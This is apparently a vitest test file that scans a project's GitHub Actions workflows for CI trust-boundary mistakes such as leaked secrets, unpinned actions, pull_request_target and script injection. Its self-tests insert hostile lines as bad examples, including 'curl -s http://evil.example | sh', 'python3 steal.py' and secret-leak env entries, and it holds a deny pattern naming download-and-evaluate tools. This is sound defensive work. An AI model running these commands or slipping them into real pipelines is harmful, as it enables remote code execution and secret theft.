/**
 * Guards for the release pipeline's trust boundaries. The rules are read from the workflow files themselves,
 * so a later edit cannot quietly put a signing secret into a job that runs build code, add a write permission
 * to the wrong job, drop a pinned SHA, or switch on pull_request_target.
 *
 * This is a plain-text check that relies on the files' own layout (two-space job keys under `jobs:`). It is a
 * tripwire for the common forms of the mistakes that matter here, not a proof and not a YAML validator:
 * the CI workflow runs actionlint for syntax. It reads EVERY file in .github/workflows, so a new workflow is
 * scanned without anyone remembering to add it here.
 */
import { readdirSync, readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

const repo = path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "..", "..");
const workflowsDir = path.join(repo, ".github", "workflows");
const workflow = (name: string): string => readFileSync(path.join(workflowsDir, name), "utf8");
const workflowFiles = (): string[] => readdirSync(workflowsDir).filter((f) => /\.ya?ml$/i.test(f)).sort();

/** The only triggers a workflow here may use. Anything that runs on someone else's content is left out. */
const ALLOWED_TRIGGERS = ["push", "pull_request", "workflow_dispatch"];
/** verify-published.yml also runs when a release is published and once a day. It has no secret and a read-only token. */
const triggersFor = (file: string): string[] => (file === "verify-published.yml" ? [...ALLOWED_TRIGGERS, "release", "schedule"] : ALLOWED_TRIGGERS);
/** What a signing job may use: it only moves finished files and signs them. */
const SIGN_ALLOWED_ACTIONS = /^actions\/(download-artifact|upload-artifact|setup-java)@/;
/** First words a signing job's shell lines may start with (the commands, not the shell's own keywords). */
const SIGN_ALLOWED_COMMANDS = new Set([
  "set", "echo", "mkdir", "cp", "mv", "rm", "ln", "ls", "cat", "tar", "find", "grep", "sort", "tail", "wc", "tr",
  "printf", "read", "local", "export", "test", "exit", "basename", "mktemp", "openssl", "base64", "security",
  "ditto", "xcrun", "hdiutil", "codesign", "spctl", "keytool", "jarsigner", "fail", "only_file",
  "New-Item", "Copy-Item", "Set-Content", "Write-Host", "Join-Path", "Remove-Item", "Get-ChildItem",
  "Get-AuthenticodeSignature", "Where-Object", "Sort-Object", "Select-Object", "ForEach-Object", "foreach", "throw",
]);
const SHELL_WORDS = new Set(["fi", "else", "then", "done", "do", "esac", "for", "while", "if", "elif", "until", "{", "}", "(", ")", ";;", "[", "[["]);
/** Quoted tool paths (bash) a signing job may run. */
const SIGN_ALLOWED_QUOTED = new Set(['"$bt/apksigner"', '"$bt/aapt2"']);

/** The jobs that may hold a secret: they receive finished files and run no repository code. */
const SECRET_JOBS = ["sign-windows", "sign-macos", "sign-android", "release"];
/** The jobs that may use the 'release' environment (and so read its secrets). */
const ENVIRONMENT_JOBS = SECRET_JOBS;
/** The jobs that sign. They must never run build tooling or check out the repository. */
const SIGN_JOBS = ["sign-windows", "sign-macos", "sign-android"];

type Job = { name: string; lines: string[] };

/** Lines with comments and blank lines removed, so a comment that mentions a rule never trips it. */
function code(lines: string[]): string[] {
  return lines.filter((l) => l.trim() !== "" && !l.trim().startsWith("#"));
}

function split(text: string): { header: string[]; jobs: Job[] } {
  const lines = text.split(/\r?\n/);
  const at = lines.findIndex((l) => l === "jobs:");
  if (at < 0) return { header: lines, jobs: [] };
  const jobs: Job[] = [];
  let current: Job | null = null;
  for (const line of lines.slice(at + 1)) {
    const m = /^ {2}([A-Za-z0-9_-]+):\s*$/.exec(line);
    if (m) {
      current = { name: m[1]!, lines: [] };
      jobs.push(current);
    } else if (current) {
      current.lines.push(line);
    }
  }
  return { header: lines.slice(0, at), jobs };
}

const indentOf = (l: string): number => l.length - l.trimStart().length;

/** The text inside every `${{ }}` and every bare `if:` value: the places a secret can be named. */
function expressions(lines: string[]): string[] {
  const text = code(lines).join("\n");
  const found = [...text.matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map((m) => m[1]!);
  for (const m of text.matchAll(/^\s*(?:-\s*)?if:\s*(?!\$\{\{)(.+)$/gm)) found.push(m[1]!);
  return found;
}

/** True when an expression names the secrets context in any form (secrets.X, secrets['X'], toJSON(secrets)). */
function namesSecrets(lines: string[]): boolean {
  return expressions(lines).some((e) => /\bsecrets\b/.test(e.replace(/\bsecrets\.GITHUB_TOKEN\b/g, "")));
}

/** The shell text of every `run:` step, with its raw lines (a `${{` in a comment still expands). */
function runBodies(lines: string[]): string[][] {
  const bodies: string[][] = [];
  for (let i = 0; i < lines.length; i++) {
    const m = /^(\s*)(-\s+)?run:\s*(.*)$/.exec(lines[i]!);
    if (!m) continue;
    const keyIndent = m[1]!.length + (m[2] ? m[2].length : 0);
    if (/^[|>][+-]?\s*$/.test(m[3]!)) {
      const body: string[] = [];
      for (let j = i + 1; j < lines.length; j++) {
        const l = lines[j]!;
        if (l.trim() !== "" && indentOf(l) <= keyIndent) break;
        body.push(l);
      }
      bodies.push(body);
    } else {
      bodies.push([m[3]!]);
    }
  }
  return bodies;
}

/** The list items under `steps:` (two spaces deeper than the job's keys, so six spaces in these files). */
function stepsOf(lines: string[]): string[][] {
  const steps: string[][] = [];
  for (const l of code(lines)) {
    if (/^ {6}- /.test(l)) steps.push([l]);
    else if (steps.length) steps[steps.length - 1]!.push(l);
  }
  return steps;
}

/** The first word of every statement in a signing job's shell text, minus the shell's own keywords. */
function commandProblems(body: string[]): string[] {
  const out: string[] = [];
  let previous = "";
  for (const raw of body) {
    const line = raw.trim();
    const continued = /(\\|`|\|)$/.test(previous);
    if (line !== "") previous = line;
    if (line === "" || line.startsWith("#") || continued) continue;
    let rest = line;
    for (;;) {
      const m = /^(?:!|if|elif|while|until|then|else|do)\s+(.*)$/.exec(rest);
      if (!m) break;
      rest = m[1]!;
    }
    const word = rest.split(/\s+/)[0]!;
    if (SHELL_WORDS.has(word) || SIGN_ALLOWED_COMMANDS.has(word)) continue;
    if (/^[A-Za-z_][A-Za-z0-9_]*(\[[^\]]*\])?\+?=/.test(word)) continue; // bash assignment
    if (/^[A-Za-z_][A-Za-z0-9_]*\(\)$/.test(word)) continue; // function definition
    if (/^\$[A-Za-z_][A-Za-z0-9_:]*$/.test(word) && /^\$[A-Za-z_][A-Za-z0-9_:]*\s*=/.test(rest)) continue; // pwsh assignment
    if (word.startsWith("(") || word.startsWith("[IO.File]::")) continue;
    if (word === "&" && /^&\s+\$signtool\.FullName\b/.test(rest)) continue;
    if (SIGN_ALLOWED_QUOTED.has(word)) continue;
    if (/^["'].*["']\s*\|\s*Out-File\b/.test(rest)) continue;
    out.push(line);
  }
  return out;
}

/** Every rule violated by one workflow file, as readable sentences. Empty means the file is fine. */
function problems(file: string, text: string): string[] {
  const out: string[] = [];
  const { header, jobs } = split(text);
  const headerCode = code(header);
  const isRelease = file === "release.yml";
  const allCode = [...headerCode, ...jobs.flatMap((j) => code(j.lines))];

  if (allCode.some((l) => /pull_request_target/.test(l))) out.push(`${file}: uses pull_request_target`);

  // The update signing keys are not in GitHub at all: nothing here may name one, sign an update, or reach for the test feature.
  if (allCode.some((l) => /TAURI_SIGNING|signer sign|minisign|SNAPPY_UPDATE_KEY/i.test(l))) out.push(`${file}: names an update signing key or signs an update (signing is offline, on the maintainer's computer)`);
  if (allCode.some((l) => /dev-update-endpoint|SNAPPY_UPDATE_ENDPOINT|SNAPPY_E2E_/.test(l) && !/grep|refus|must not|never|absent/i.test(l))) out.push(`${file}: names the end-to-end update test feature`);
  // A workflow drafts at most. It never publishes, edits or marks a release, and never makes a pre-release.
  if (allCode.some((l) => /\bgh release (edit|upload|delete)\b|--prerelease|--draft=false|--latest(?!=false)|\bpublish\b.*gh release/.test(l))) out.push(`${file}: publishes, edits or marks a release (only a draft with --latest=false may be created here)`);
  for (const l of allCode) if (/\bgh release create\b/.test(l) && !/--draft\b/.test(l)) out.push(`${file}: creates a release that is not a draft`);

  for (const l of allCode) {
    const m = /^\s*(?:-\s*)?uses:\s*(\S+)/.exec(l);
    if (m && !m[1]!.startsWith("./") && !/@[0-9a-f]{40}$/.test(m[1]!)) out.push(`${file}: action not pinned to a full commit SHA: ${m[1]}`);
  }

  // Workflow-level permissions: read-only, and stated.
  const topPerm = /^permissions:\s*\n((?:[ ]{2}.*\n?)*)/m.exec(header.join("\n") + "\n");
  if (!topPerm) out.push(`${file}: no top-level permissions block`);
  else if (/write/.test(topPerm[1]!)) out.push(`${file}: top-level permissions include write`);
  else if (!/contents:\s*read/.test(topPerm[1]!)) out.push(`${file}: top-level permissions are not contents: read`);

  if (namesSecrets(header)) out.push(`${file}: a secret is referenced at workflow level`);

  // Triggers: only the ones that cannot run on someone else's content. Covers `on: push`, `on: [a, b]` and the block form.
  const onAt = header.findIndex((l) => /^["']?on["']?:/.test(l));
  if (onAt < 0) out.push(`${file}: no on: block`);
  else {
    const found: string[] = [];
    const inline = /^["']?on["']?:\s*(.+?)\s*$/.exec(header[onAt]!);
    if (inline && !inline[1]!.startsWith("#")) found.push(...inline[1]!.replace(/[[\]{}"']/g, "").split(/[,\s]+/).filter(Boolean));
    for (const l of code(header.slice(onAt + 1))) {
      if (indentOf(l) === 0) break;
      const m = /^ {2}["']?([A-Za-z_]+)["']?:/.exec(l);
      if (m) found.push(m[1]!);
    }
    for (const t of found) if (!triggersFor(file).includes(t)) out.push(`${file}: trigger ${t} is not allowed (allowed: ${triggersFor(file).join(", ")})`);
  }

  // Every checkout drops the token from the checked-out repository, so later steps cannot push with it.
  for (const job of jobs) {
    for (const step of stepsOf(job.lines)) {
      if (/uses:\s*actions\/checkout@/.test(step.join("\n")) && !/persist-credentials:\s*false\b/.test(step.join("\n"))) out.push(`${file}: job ${job.name} checks out without persist-credentials: false`);
    }
  }

  // Nothing is interpolated into a script: a `${{ }}` inside `run:` runs whatever the value holds. Pass it through env.
  for (const job of jobs) {
    for (const body of runBodies(job.lines)) {
      if (body.some((l) => l.includes("${{"))) out.push(`${file}: job ${job.name} has \${{ }} inside a run: script (pass it through env: instead)`);
    }
  }

  for (const job of jobs) {
    const body = code(job.lines);
    const joined = body.join("\n");
    const mayHoldSecrets = isRelease && SECRET_JOBS.includes(job.name);

    if (!mayHoldSecrets && namesSecrets(job.lines)) out.push(`${file}: job ${job.name} references a secret`);
    if (!mayHoldSecrets && /^\s*secrets:/m.test(joined)) out.push(`${file}: job ${job.name} passes secrets on`);
    if (/secrets:\s*inherit/.test(joined)) out.push(`${file}: job ${job.name} inherits all secrets`);
    if (/^ {4}environment:/m.test(joined) && !(isRelease && ENVIRONMENT_JOBS.includes(job.name))) out.push(`${file}: job ${job.name} uses an environment`);
    if (!/^ {4}permissions:/m.test(joined)) out.push(`${file}: job ${job.name} does not state its permissions`);

    // Write permissions in block or flow form, and write-all.
    const writes = [...joined.matchAll(/([A-Za-z-]+):\s*write\b(?!-)/g)].map((m) => `${m[1]}: write`);
    if (/\bwrite-all\b/.test(joined)) writes.push("write-all");
    const allowedWrites = !isRelease ? [] : job.name === "release" ? ["contents: write"] : job.name === "attest" ? ["id-token: write", "attestations: write"] : [];
    for (const w of writes) if (!allowedWrites.includes(w)) out.push(`${file}: job ${job.name} has write permission ${w}`);

    if (isRelease && SIGN_JOBS.includes(job.name)) {
      // Signing jobs run a short list of tools on finished files, and nothing else.
      for (const step of stepsOf(job.lines)) {
        const u = /^\s*-?\s*uses:\s*(\S+)/m.exec(step.join("\n"));
        if (u && !SIGN_ALLOWED_ACTIONS.test(u[1]!)) out.push(`${file}: signing job ${job.name} uses an action outside the allow-list: ${u[1]}`);
      }
      for (const run of runBodies(job.lines)) {
        for (const l of commandProblems(run)) out.push(`${file}: signing job ${job.name} runs a command outside the allow-list: ${l}`);
        if (/\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod|Invoke-Expression|iex|eval)\b|\|\s*(sh|bash|zsh|pwsh|powershell)\b|\b(bash|sh|python3?|perl|ruby)\s+-[ce]\b/.test(run.filter((l) => !l.trim().startsWith("#")).join("\n"))) {
          out.push(`${file}: signing job ${job.name} downloads or evaluates code`);
        }
      }
      if (/actions\/checkout/.test(joined)) out.push(`${file}: signing job ${job.name} checks out the repository`);
      if (/\b(npm|npx|cargo|rustup|tauri|node|gradle|gradlew)\b/.test(joined)) out.push(`${file}: signing job ${job.name} runs build tooling`);
      if (!/^ {4}environment:\s*release\s*$/m.test(joined)) out.push(`${file}: signing job ${job.name} is not behind the release environment`);
      if (!/^ {4}permissions:\s*\{\}\s*$/m.test(joined)) out.push(`${file}: signing job ${job.name} should have permissions: {}`);
      if (!/needs\.verify\.outputs\.official == 'true'/.test(joined)) out.push(`${file}: signing job ${job.name} does not require an official run`);
      // The build artifact is untrusted. Names or contents taken from it must never reach the environment
      // that later steps (and their secrets) run under. A file name can hold newlines and so add variables.
      const firstSecret = joined.search(/\$\{\{[^}]*\bsecrets\b/);
      const beforeSecrets = firstSecret < 0 ? joined : joined.slice(0, firstSecret);
      if (!/Check the files from the build/.test(beforeSecrets)) out.push(`${file}: signing job ${job.name} does not check the build artifact before it reads a secret`);
    }
    if (isRelease && mayHoldSecrets && /GITHUB_(ENV|PATH)/.test(joined)) out.push(`${file}: job ${job.name} writes to GITHUB_ENV or GITHUB_PATH`);
    if (isRelease && job.name === "release") {
      if (!/needs\.verify\.outputs\.official == 'true'/.test(joined)) out.push(`${file}: release job does not require an official run`);
      if (/actions\/checkout|npm|cargo/.test(joined)) out.push(`${file}: release job runs repository or build code`);
    }
  }

  // Installing and building: no install scripts, locked dependencies.
  for (const l of allCode) {
    if (/\bnpm ci\b/.test(l) && !/--ignore-scripts/.test(l)) out.push(`${file}: npm ci without --ignore-scripts: ${l.trim()}`);
    if (/\bnpm install\b/.test(l)) out.push(`${file}: npm install instead of npm ci: ${l.trim()}`);
  }
  return out;
}

describe("workflow trust boundaries (the real files)", () => {
  it("scans every file in .github/workflows, not a fixed list", () => {
    const files = workflowFiles();
    expect(files).toEqual(expect.arrayContaining(["release.yml", "ci.yml", "desktop-smoke.yml"]));
    for (const file of files) expect(problems(file, workflow(file)), file).toEqual([]);
  });

  it("runs actionlint in CI, pinned to a version, so a syntax error is caught", () => {
    const ci = workflow("ci.yml");
    expect(ci).toMatch(/actionlint@v\d+\.\d+\.\d+/);
    expect(ci).not.toMatch(/actionlint@latest/);
  });

  it("release.yml only runs for a tag push or by hand, and checks the tag is on main", () => {
    const text = workflow("release.yml");
    const on = /^on:\n((?:[ ]{2}.*\n|\n)*)/m.exec(text)![1]!;
    expect(on).not.toMatch(/pull_request|schedule|workflow_run|issue|\bpush:\s*\n\s+branches/);
    expect(on).toMatch(/tags:\s*\["v\*"\]/);
    expect(on).toMatch(/workflow_dispatch:/);
    const verify = split(text).jobs.find((j) => j.name === "verify")!;
    const body = code(verify.lines).join("\n");
    expect(body).toMatch(/fetch-depth:\s*0/);
    expect(body).toMatch(/git merge-base --is-ancestor HEAD "origin\/\$\{RELEASE_BRANCH\}"/);
    expect(body).toMatch(/\[ "\$EVENT_NAME" = "push" \] && \[ "\$REF_TYPE" = "tag" \]/);
  });

  it("only the build, sign and release jobs exist in the order the design needs", () => {
    const names = split(workflow("release.yml")).jobs.map((j) => j.name);
    expect(names).toEqual(["verify", "desktop", "android", "ios", "sign-windows", "sign-macos", "sign-android", "attest", "release"]);
  });

  it("never builds the test hooks (the dev-hooks feature keeps the WebView2 debugging variables)", () => {
    for (const file of ["release.yml", "desktop-smoke.yml", "ci.yml"]) expect(workflow(file)).not.toMatch(/dev-hooks/);
  });

  it("builds the Windows installer as NSIS only, with no MSI anywhere in the pipeline", () => {
    const text = workflow("release.yml");
    const win = /- name: windows-x64\n((?: {12}.*\n)+)/.exec(text)![1]!;
    expect(win).toMatch(/bundles: nsis\n/);
    expect(win).toMatch(/expect: "exe"/);
    expect(code(text.split(/\r?\n/)).join("\n")).not.toMatch(/\.msi|nsis,msi|"exe msi"/);
  });

  it("drafts a release with --latest=false and nothing else about publishing", () => {
    const text = code(workflow("release.yml").split(/\r?\n/)).join("\n");
    expect(text.match(/gh release create/g)).toHaveLength(1);
    expect(text).toMatch(/gh release create "\$TAG" dist\/\* --draft --latest=false --verify-tag/);
    expect(text).not.toMatch(/gh release (edit|upload|delete)|--prerelease|--latest(?!=false)/);
    expect(text).not.toMatch(/--draft=false/);
  });

  it("builds official runs with SNAPPY_RELEASE=1 and checks the built Windows program", () => {
    const desktop = code(split(workflow("release.yml")).jobs.find((j) => j.name === "desktop")!.lines).join("\n");
    expect(desktop).toMatch(/SNAPPY_RELEASE: \$\{\{ needs\.verify\.outputs\.official == 'true' && '1' \|\| '' \}\}/);
    expect(desktop).toMatch(/node apps\/app\/tools\/check-no-network-deps\.mjs --exe apps\/app\/src-tauri\/target\/release\/snappy\.exe/);
    expect(desktop).not.toMatch(/dev-update-endpoint|SNAPPY_UPDATE_ENDPOINT|SNAPPY_E2E/);
  });

  it("refuses a pre-release tag and a tag lower than the highest existing one", () => {
    const verify = code(split(workflow("release.yml")).jobs.find((j) => j.name === "verify")!.lines).join("\n");
    expect(verify).toMatch(/\[\[ "\$REF_NAME" == \*-\* \]\]/);
    expect(verify).toMatch(/\^v\[0-9\]\+\\\.\[0-9\]\+\\\.\[0-9\]\+\$/);
    expect(verify).toMatch(/sort -V/);
    expect(verify).toMatch(/is lower than the existing tag/);
  });

  it("has no update signing key, no signing job for updates, and only the existing jobs behind the release environment", () => {
    for (const file of workflowFiles()) {
      const text = code(workflow(file).split(/\r?\n/)).join("\n");
      expect(text, file).not.toMatch(/TAURI_SIGNING|signer sign|minisign/i);
    }
    const withEnvironment = split(workflow("release.yml")).jobs.filter((j) => /^ {4}environment:/m.test(code(j.lines).join("\n"))).map((j) => j.name);
    expect(withEnvironment).toEqual(["sign-windows", "sign-macos", "sign-android", "release"]);
    for (const file of workflowFiles().filter((f) => f !== "release.yml")) expect(workflow(file), file).not.toMatch(/^ {4}environment:/m);
  });

  it("checks the published release every day and when one is published, with no secret and a read-only token", () => {
    const text = workflow("verify-published.yml");
    expect(text).toMatch(/release:\n\s+types: \[published\]/);
    expect(text).toMatch(/schedule:\n\s+- cron:/);
    expect(text).toMatch(/workflow_dispatch:/);
    const body = code(text.split(/\r?\n/)).join("\n");
    expect(body).not.toMatch(/secrets\.(?!GITHUB_TOKEN)|environment:|contents: write|permissions:\s*\n\s+\w+: write/);
    expect(body).toMatch(/cargo run --locked --release --example verify_manifest/);
    // The verifier is built from the shell, which embeds the built page (not committed): the page is built first, or the
    // daily check could never compile.
    const at = (re: RegExp): number => body.search(re);
    expect(at(/actions\/setup-node@/)).toBeGreaterThan(-1);
    expect(at(/npm ci --ignore-scripts/)).toBeGreaterThan(at(/actions\/setup-node@/));
    expect(at(/node apps\/app\/scripts\/build-frontend\.mjs/)).toBeGreaterThan(at(/npm ci --ignore-scripts/));
    expect(at(/cargo run --locked --release --example verify_manifest/)).toBeGreaterThan(at(/node apps\/app\/scripts\/build-frontend\.mjs/));
    expect(body).toMatch(/highest published/);
    expect(body).toMatch(/LATEST_URL: https:\/\/github\.com\/XrxcGH\/Snappy\/releases\/latest\/download\/latest\.json/);
    expect(body).toMatch(/ProductVersion/);
  });

  it("runs a dry run of the verifier in CI, after the page is built, so the daily check cannot rot", () => {
    const ci = code(workflow("ci.yml").split(/\r?\n/)).join("\n");
    const rust = ci.slice(ci.indexOf("rust-tests:"), ci.indexOf("no-network-deps:"));
    const build = rust.search(/node apps\/app\/scripts\/build-frontend\.mjs/);
    expect(build).toBeGreaterThan(-1);
    expect(rust.search(/node apps\/app\/tools\/verify-dry-run\.mjs/)).toBeGreaterThan(build);
  });

  it("makes the owner the required reviewer of the files that pin the tool run with the signing passphrase", () => {
    const owners = readFileSync(path.join(repo, ".github", "CODEOWNERS"), "utf8");
    for (const file of ["/package.json", "/package-lock.json", "/apps/app/package.json", "/apps/app/tools/", "/apps/app/src-tauri/Cargo.lock"]) {
      expect(owners, file).toMatch(new RegExp(`^${file.replace(/[./\\]/g, "\\$&")}\\s+@XrxcGH$`, "m"));
    }
  });

  it("builds with locked dependencies", () => {
    expect(workflow("release.yml")).toMatch(/args\+=\(-- --locked\)/);
    expect(workflow("desktop-smoke.yml")).toMatch(/build --debug --no-bundle -- --locked/);
  });

  it("makes a missing Android file visible in the release notes", () => {
    const text = workflow("release.yml");
    expect(text).toMatch(/list_files "Android APK" "\*android\*\.apk" no/);
    expect(text).toMatch(/NOT ATTACHED/);
    expect(text).toMatch(/::warning::/);
  });
});

describe("the checker itself catches the mistakes it is for", () => {
  const good = workflow("release.yml");

  it("catches an update signing key, a published release and the test feature in a workflow", () => {
    expect(problems("release.yml", good.replace("  desktop:\n", "  desktop:\n    env:\n      K: x\n      TAURI_SIGNING_PRIVATE_KEY_PATH: key\n")).join("\n")).toMatch(/update signing key/);
    expect(problems("release.yml", good.replace("--draft --latest=false", "--latest")).join("\n")).toMatch(/not a draft|marks a release/);
    expect(problems("release.yml", good.replace("--draft --latest=false", "--draft --prerelease")).join("\n")).toMatch(/marks a release/);
    expect(problems("release.yml", good.replace("gh release create", "gh release edit --draft=false\n          gh release create")).join("\n")).toMatch(/marks a release/);
    expect(problems("release.yml", good.replace("npm ci --ignore-scripts\n", "npm ci --ignore-scripts\n      - run: cargo build --features dev-update-endpoint\n")).join("\n")).toMatch(/test feature/);
    expect(problems("verify-published.yml", workflow("verify-published.yml"))).toEqual([]);
    const withRelease = workflow("ci.yml").replace(/^on:/m, "on:\n  release:\n    types: [published]\n  _x_:");
    expect(problems("ci.yml", withRelease).join("\n")).toMatch(/trigger release is not allowed/);
  });

  it("catches a secret added to a build job", () => {
    const bad = good.replace("  desktop:\n", "  desktop:\n    env:\n      LEAK: ${{ secrets.APPLE_CERTIFICATE }}\n");
    expect(problems("release.yml", bad).join("\n")).toMatch(/job desktop references a secret/);
  });

  it("catches an environment on a build job", () => {
    const bad = good.replace("  android:\n", "  android:\n    environment: release\n");
    expect(problems("release.yml", bad).join("\n")).toMatch(/job android uses an environment/);
  });

  it("catches contents: write on the wrong job and at workflow level", () => {
    const bad = good.replace("  attest:\n", "  attest:\n    permissions:\n      contents: write\n");
    expect(problems("release.yml", bad).join("\n")).toMatch(/job attest has write permission contents: write/);
    const bad2 = good.replace("permissions:\n  contents: read\n", "permissions:\n  contents: write\n");
    expect(problems("release.yml", bad2).join("\n")).toMatch(/top-level permissions include write/);
  });

  it("catches an unpinned action, pull_request_target and a signing job that builds", () => {
    expect(problems("ci.yml", workflow("ci.yml").replace(/actions\/setup-node@[0-9a-f]{40}/, "actions/setup-node@v4")).join("\n")).toMatch(/not pinned/);
    expect(problems("ci.yml", workflow("ci.yml").replace("  pull_request:", "  pull_request_target:")).join("\n")).toMatch(/pull_request_target/);
    const bad = good.replace("      - name: Sign the installers\n", "      - run: npm ci --ignore-scripts\n      - name: Sign the installers\n");
    expect(problems("release.yml", bad).join("\n")).toMatch(/signing job sign-windows runs build tooling/);
  });

  it("catches npm ci without --ignore-scripts and a secret in another workflow", () => {
    expect(problems("ci.yml", workflow("ci.yml").replace("- run: npm ci --ignore-scripts", "- run: npm ci")).join("\n")).toMatch(/npm ci without --ignore-scripts/);
    expect(problems("desktop-smoke.yml", workflow("desktop-smoke.yml").replace("    steps:\n", "    env:\n      X: ${{ secrets.FOO }}\n    steps:\n")).join("\n")).toMatch(/references a secret/);
  });

  it("catches a signing job that puts a value from the build artifact into GITHUB_ENV", () => {
    const bad = good.replace('codesign --verify --deep --strict --verbose=2 "$APP_PATH"\n', 'codesign --verify --deep --strict --verbose=2 "$APP_PATH"\n          echo "APP_PATH=$app" >> "$GITHUB_ENV"\n');
    expect(bad).not.toBe(good);
    expect(problems("release.yml", bad).join("\n")).toMatch(/job sign-macos writes to GITHUB_ENV or GITHUB_PATH/);
    const bad2 = good.replace('mv "$DMG_PATH" "out/$DMG_NAME"', 'echo "DMG_PATH=$x" >> "$GITHUB_PATH"');
    expect(problems("release.yml", bad2).join("\n")).toMatch(/job sign-macos writes to GITHUB_ENV or GITHUB_PATH/);
  });

  it("catches a signing job whose artifact check was removed", () => {
    const bad = good.replace("Check the files from the build and unpack the app (no secrets in this step)", "Unpack the app");
    expect(problems("release.yml", bad).join("\n")).toMatch(/signing job sign-macos does not check the build artifact/);
  });

  it("uses fixed names for the macOS app and disk image, and only a checked .dmg name travels on", () => {
    const mac = code(split(good).jobs.find((j) => j.name === "sign-macos")!.lines).join("\n");
    expect(mac).toMatch(/APP_PATH: work\/Snappy\.app/);
    expect(mac).toMatch(/DMG_PATH: out\/Snappy\.dmg/);
    expect(mac).toMatch(/safe='\^\[A-Za-z0-9\._-\]\+\$'/);
    expect(mac).toMatch(/tar -tf/);
    expect(mac).not.toMatch(/find work .*-name '\*\.app'/);
  });

  const ci = workflow("ci.yml");
  const swap = (text: string, from: string, to: string): string => {
    expect(text, `the text to mutate (${from}) must exist`).toContain(from);
    return text.replace(from, to);
  };
  const found = (file: string, text: string): string => problems(file, text).join("\n");

  it("catches a secret named in a form other than secrets.NAME", () => {
    const bracket = swap(good, "  desktop:\n", "  desktop:\n    env:\n      LEAK: ${{ secrets['APPLE_CERTIFICATE'] }}\n");
    expect(found("release.yml", bracket)).toMatch(/job desktop references a secret/);
    const all = swap(ci, "  test:\n", "  test:\n    env:\n      ALL: ${{ toJSON(secrets) }}\n");
    expect(found("ci.yml", all)).toMatch(/job test references a secret/);
    const guarded = swap(ci, "  test:\n", "  test:\n    if: secrets.X != ''\n");
    expect(found("ci.yml", guarded)).toMatch(/job test references a secret/);
    const atTop = swap(ci, "permissions:\n  contents: read\n", "permissions:\n  contents: read\nenv:\n  A: ${{ secrets.A }}\n");
    expect(found("ci.yml", atTop)).toMatch(/workflow level/);
  });

  it("allows the GitHub token, and the word 'secrets' in a step name", () => {
    const ok = swap(ci, "  test:\n", "  test:\n    env:\n      T: ${{ secrets.GITHUB_TOKEN }}\n");
    expect(found("ci.yml", ok)).toBe("");
    expect(good).toMatch(/this job has no secrets/);
  });

  it("catches write-all and flow-style write permissions", () => {
    const wa = swap(ci, "    permissions:\n      contents: read\n    strategy:", "    permissions: write-all\n    strategy:");
    expect(found("ci.yml", wa)).toMatch(/job test has write permission write-all/);
    const flow = swap(ci, "    permissions:\n      contents: read\n    strategy:", "    permissions: { contents: write }\n    strategy:");
    expect(found("ci.yml", flow)).toMatch(/job test has write permission contents: write/);
    const top = swap(ci, "permissions:\n  contents: read\n", "permissions: write-all\n");
    expect(found("ci.yml", top)).toMatch(/top-level permissions|no top-level/);
  });

  it("catches triggers that run on someone else's content, in any workflow", () => {
    for (const trigger of ["workflow_run", "issue_comment", "issues", "pull_request_review", "schedule", "pull_request_target"]) {
      const bad = swap(ci, "  pull_request:\n", `  pull_request:\n  ${trigger}:\n`);
      expect(found("ci.yml", bad), trigger).toMatch(new RegExp(`${trigger}`));
    }
    expect(found("ci.yml", swap(ci, "on:\n  push:\n    branches: [main]\n  pull_request:\n", "on: [push, workflow_run]\n"))).toMatch(/trigger workflow_run is not allowed/);
    expect(found("ci.yml", swap(ci, "on:\n  push:\n    branches: [main]\n  pull_request:\n", "on: issue_comment\n"))).toMatch(/trigger issue_comment is not allowed/);
  });

  it("scans a workflow file nobody listed anywhere", () => {
    const extra = "name: Extra\non:\n  pull_request_target:\npermissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - run: echo hi\n";
    expect(found("extra.yml", extra)).toMatch(/pull_request_target/);
  });

  it("catches a checkout that keeps the token", () => {
    const keep = swap(ci, "          persist-credentials: false\n", "          persist-credentials: true\n");
    expect(found("ci.yml", keep)).toMatch(/job test checks out without persist-credentials: false/);
    const missing = swap(ci, "        with:\n          persist-credentials: false\n      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0\n        with:\n          node-version: 24\n          cache: npm\n", "      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0\n        with:\n          node-version: 24\n          cache: npm\n");
    expect(found("ci.yml", missing)).toMatch(/checks out without persist-credentials/);
  });

  it("catches an expression inside a run script, even in a comment, and allows it in env", () => {
    const inject = swap(ci, "        run: npm test\n", "        run: echo \"${{ github.event.pull_request.title }}\"\n");
    expect(found("ci.yml", inject)).toMatch(/job test has \$\{\{ \}\} inside a run: script/);
    const block = swap(ci, "        run: npm test\n", "        run: |\n          # ${{ github.head_ref }}\n          npm test\n");
    expect(found("ci.yml", block)).toMatch(/inside a run: script/);
    const viaEnv = swap(ci, "        run: npm test\n", "        env:\n          TITLE: ${{ github.event.pull_request.title }}\n        run: echo \"$TITLE\"\n");
    expect(found("ci.yml", viaEnv)).toBe("");
  });

  it("catches a signing job that runs a command outside the allow-list", () => {
    const script = swap(good, "      - name: Sign the installers\n", "      - run: ./evil.sh\n      - name: Sign the installers\n");
    expect(found("release.yml", script)).toMatch(/signing job sign-windows runs a command outside the allow-list: \.\/evil\.sh/);
    const piped = swap(good, "          $ErrorActionPreference = 'Stop'\n          New-Item", "          $ErrorActionPreference = 'Stop'\n          curl -s http://evil.example | sh\n          New-Item");
    const r = found("release.yml", piped);
    expect(r).toMatch(/runs a command outside the allow-list: curl/);
    expect(r).toMatch(/downloads or evaluates code/);
    const mac = swap(good, "          mkdir -p out\n          staging=$(mktemp -d)\n", "          mkdir -p out\n          python3 steal.py\n          staging=$(mktemp -d)\n");
    expect(found("release.yml", mac)).toMatch(/signing job sign-macos runs a command outside the allow-list: python3 steal\.py/);
  });

  it("catches a signing job that uses an action outside the allow-list", () => {
    const at = good.indexOf("\n  sign-android:\n");
    const bad = good.slice(0, at) + swap(good.slice(at), "      - uses: actions/setup-java@b843ebf9b913146b38da2eaa7aeddf76074ae1ad # v6.1.0\n", "      - uses: some-org/some-action@0123456789abcdef0123456789abcdef01234567\n");
    expect(found("release.yml", bad)).toMatch(/signing job sign-android uses an action outside the allow-list: some-org\/some-action/);
  });

  it("ignores a comment that only talks about the rules", () => {
